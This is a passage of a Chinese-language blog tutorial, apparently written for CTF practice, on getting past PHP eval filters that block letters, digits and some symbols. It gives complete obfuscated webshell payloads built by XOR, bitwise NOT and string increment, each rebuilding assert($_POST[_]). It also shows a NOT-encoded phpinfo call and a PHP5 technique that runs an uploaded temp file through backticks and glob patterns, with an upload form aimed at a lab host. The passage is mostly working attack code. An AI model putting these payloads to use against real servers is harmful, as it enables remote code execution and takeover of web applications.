class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首要思路是，将非字母、数字的字符经过变换之后，能够构造出<code>a-z</code>中的任意字符，在利用PHP允许动态函数执行的特点，拼接出函数名，如<code>assert</code>，然后动态执行即可。</p><p>在<code>PHP5</code>中，<code>assert</code>是一个函数，可以通过<code>$f=&#39;assert&#39;;$f(xxx);</code>的方式来动态执行任意代码。</p><p>在<code>PHP7</code>中，<code>assert</code>是一个语言结构（类似于<code>eval</code>），不能在作为函数名动态执行代码；可以利用<code>file_put_contents</code>函数，来进行getshell。</p><h4 id="方式一：异或"><a href="#方式一：异或" class="headerlink" title="方式一：异或"></a>方式一：异或</h4><p>如下代码，通过字符异或的方式，构造出webshell。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line">        <span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line">        <span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line">        <span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>URL编码或可显示字符</th><th>ASCII编码</th><th>二进制</th></tr></thead><tbody><tr><td>%01</td><td>1</td><td>00000001</td></tr><tr><td>&#96;</td><td>96</td><td>01100000</td></tr><tr><td>a</td><td>97</td><td>01100001</td></tr><tr><td>%13</td><td>19</td><td>00010011</td></tr><tr><td>&#96;</td><td>96</td><td>01100000</td></tr><tr><td>s</td><td>115</td><td>01110011</td></tr></tbody></table><p>通过上面对非字母、数字的字符进行异或操作，可以拼接出<code>assert($_POST[_]);</code>，即构造出无字母数字的webshell，执行PHP代码；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure><p><img src="/web-hate-php/image-20230215111406835.png" alt="image-20230215111406835"></p><h4 id="方式二：取反"><a href="#方式二：取反" class="headerlink" title="方式二：取反"></a>方式二：取反</h4><p>利用<code>UTF-8</code>编码后的汉字，取出其中的某个字符，然后再进行取反操作；</p><p>例如汉字<code>和</code>的<code>UTF-8</code>编码为<code>&amp;#x548C;</code>，第二个字节的字符为<code>\x8c</code>，其二进制编码为<code>10001100</code>，对其取反后的二进制为<code>01110011</code>，即字符<code>s</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="string">&quot;和&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> ~(<span class="variable">$_</span>&#123;<span class="number">2</span>&#125;).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要想获得第二个字节字符，就必须包含数字2；由于PHP弱类型的特性，其<code>True</code>值为<code>1</code>，因此<code>True+True=2</code>，可利用<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)</code>的值为<code>2</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$__</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用上述方式，构造如下的payload；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);        <span class="comment">// $__ = &#x27;2&#x27;</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;             <span class="comment">// $_ = &#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;       <span class="comment">// 定义空的拼接字符</span></span><br><span class="line">        <span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line">        <span class="comment">// $____ = &#x27;assert&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line">        <span class="comment">// $_____ = &#x27;_POST&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$$_____</span>;             <span class="comment">// $_ = &#x27;$_POST&#x27;</span></span><br><span class="line">        <span class="variable">$____</span>(<span class="variable">$_</span>[__]);          <span class="comment">// assert($_POST[__])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[__]);</span><br></pre></td></tr></table></figure><p>对上述的payload进行URL编码，即可成功执行；</p><p><img src="/web-hate-php/image-20230223150443380.png" alt="image-20230223150443380"></p><h4 id="方式三：自增"><a href="#方式三：自增" class="headerlink" title="方式三：自增"></a>方式三：自增</h4><p>根据PHP官方文档，PHP在处理字符变量的算数运算时，沿用了Perl的习惯，即<code>&#39;a&#39;++ &gt; &#39;b&#39;</code>、<code>&#39;b&#39;++ &gt; &#39;c&#39;</code>，只要能获取到大小写字母<code>Aa</code>，可以通过自增操作获得所有的大小写字母。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.php.net/manual/zh/language.operators.increment.php</span><br></pre></td></tr></table></figure><p><img src="/web-hate-php/image-20230223151600634.png" alt="image-20230223151600634"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">        <span class="variable">$_</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line">        <span class="variable">$_</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在PHP中，数组（Array）的首字母是大写字母<code>A</code>，第四个字母是小写字母<code>a</code>，能够同时获取到大小写字母<code>Aa</code>；</p><p>在PHP中，如果强制连接数组和字符串，数组将被强制转换成字符串，其值为<code>Array</code>；</p><p>PS：对PHP版本有要求，低版本的PHP不好使；使用的PHP版本为5.6.9；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$_</span>=[];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用上述方法，构造payload；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];   $_=&#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure><p>对上述的payload进行URL编码，即可成功执行；</p><p><img src="/web-hate-php/image-20230223154049182.png" alt="image-20230223154049182"></p><p>自此完成了无字母数字的webshell的构建；</p><h3 id="无特殊字符webshell"><a href="#无特殊字符webshell" class="headerlink" title="无特殊字符webshell"></a>无特殊字符webshell</h3><p>在过滤掉字母数字的基础上，继续过滤掉了<code>_$@</code>等特殊字符，同时对长度有限制；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,<span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在PHP7中新增方法可以执行动态函数，例如可以通过<code>(&#39;phpinfo&#39;)();</code>的方式来执行函数，第一个括号中的可以是任意的PHP表达式；</p><p>通过取反的方式构造一个执行<code>phpinfo</code>的payload；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>p</th><th>h</th><th>i</th><th>n</th><th>f</th><th>o</th></tr></thead><tbody><tr><td>二进制</td><td>01110000</td><td>01101000</td><td>01101001</td><td>01101110</td><td>01100110</td><td>01101111</td></tr><tr><td>取反</td><td>10001111</td><td>10010111</td><td>10010110</td><td>10010001</td><td>10011001</td><td>10010000</td></tr><tr><td>十六进制</td><td>0x8F</td><td>0x97</td><td>0x96</td><td>0x91</td><td>0x99</td><td>0x90</td></tr><tr><td>URL编码</td><td>%8F</td><td>%97</td><td>%96</td><td>%91</td><td>%99</td><td>%90</td></tr></tbody></table><p><img src="/web-hate-php/image-20230223161941485.png" alt="image-20230223161941485"></p><p>由于PHP5中不支持此类方法，该方式在PHP5中不适用。</p><p>下面介绍PHP5中的解决方法。</p><p>在PHP中可以利用<code>反引号</code>来执行shell，与操作系统进行交互，而<code>反引号</code>不属于字母数字的范围，因此可以进行利用；</p><ul><li>shell下可以利用<code>.</code>来执行任意脚本</li><li>Linux文件名支持使用glob通配符来进行代替</li></ul><p>Linux系统中，<code>.</code>的作用和<code>source</code>是一样的，使用当前的shell执行一个文件中的命令；如当前运行的shell是bash，<code>. file</code>就是使用bash执行<code>file</code>文件中的命令；使用<code>. file</code>执行文件，不需要文件<code>file</code>具有可执行<code>x</code>权限；因此可以在服务器中构造一个可控的文件，使用<code>.</code>来执行该文件，即可获得shell。</p><p>向PHP发送一个上传文件的POST包，此时PHP会将上传的文件保存在临时文件夹下，默认保存的文件名为<code>/tmp/phpXXXXXX</code>，后面6位字符都是随机的大小写字母，此时可以使用Linux下的glob通配符来进行表示；</p><ul><li><code>*</code>代表0个及以上任意字符</li><li><code>?</code>代表1个任意字符</li></ul><p>利用通配符，<code>/tmp/phpXXXXXX</code>可以表示成<code>/*/?????????</code>或者<code>/???/?????????</code>；利用通配符查看文件，发现匹配出多个文件，无法精准定位到待执行文件；</p><p>PS：由于文件会自动清除，此处手动构造了上传文件用于展示；</p><p><img src="/web-hate-php/image-20230224104417525.png" alt="image-20230224104417525"></p><p>glob支持用<code>[^x]</code>的方法来排除该位置为<code>x</code>的字符，可以利用该方式来排除包含<code>-</code>以及<code>.</code>的文件；</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /???/???[^-]?????</span><br></pre></td></tr></table></figure><p><img src="/web-hate-php/image-20230224104944540.png" alt="image-20230224104944540"></p><p>但是依旧无法精准定位到待执行文件；观察展示的文件，发现只有待执行的文件包含有大写字母；</p><p>glob与正则表达式类似，支持使用<code>[A-Z]</code>来表示一个范围；由ASCII码表可知，大写字母在<code>?-[</code>之间，因此可以使用<code>[?-[]</code>来表示所有的大写字母；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /???/????????[?-[]</span><br></pre></td></tr></table></figure><p><img src="/web-hate-php/image-20230224105724932.png" alt="image-20230224105724932"></p><p>构造一个如下的上传页面，进行POST文件上传；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.136.128:9090/index.php?code=?&gt;&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f%5B%3f-%5B%5D`;?&gt;&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">p</span>&gt;</span>文件:</span><br><span class="line">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>截获如下数据包，进行上传，由于每次随机生成的PHP文件名最后一位不一定是大写字母，因此需要多次尝试；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span 